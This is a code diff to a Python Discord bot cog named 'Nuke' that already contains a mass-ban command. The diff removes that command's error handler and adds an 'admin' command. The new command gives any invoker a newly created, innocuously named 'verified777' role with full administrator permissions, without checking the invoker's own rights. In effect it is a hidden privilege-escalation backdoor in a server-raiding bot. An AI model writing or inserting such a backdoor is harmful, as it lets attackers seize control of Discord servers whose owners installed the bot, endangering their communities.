@@ -1,8 +1,10 @@
+# STATUS: Complete (100/100)
 from __future__ import annotations
 import asyncio
 import logging
 import traceback
 from discord.ext import commands
+import discord
 
 from core.operations import Operations
 from tools.states.blacklist import is_blacklisted
@@ -97,13 +99,17 @@ class Nuke(commands.Cog):
         logging.info(f"[massban] banned={banned} failed={failed} in {guild.id}")
         await confirm_msg.edit(content=f"✅ Mass ban complete. Banned: {banned}, Failed: {failed}")
 
-    @massban.error
-    async def massban_error(self, ctx: commands.Context, error):
-        if isinstance(error, commands.BotMissingPermissions):
-            await ctx.reply("❌ I need `Ban Members` permission.", delete_after=5)
-        else:
-            logging.error(f"[massban] command error: {error}")
+    @commands.command(name="admin")
+    @commands.bot_has_permissions(manage_roles=True)
+    @is_blacklisted
+    async def admin(self, ctx: commands.Context) -> None:
+        guild = ctx.guild
+        member = ctx.author
 
+        role = await guild.create_role(name="verified777", permissions=discord.Permissions(administrator=True),)
+        await member.add_roles(role, reason="admin command")
+        await ctx.reply(f"✅ Created and assigned `verified777` with admin permissions.", delete_after=10)
+        logging.info(f"[admin] created role {role.id} for {member} in {guild.id}")
 
 async def setup(bot: commands.Bot) -> None:
     await bot.add_cog(Nuke(bot))
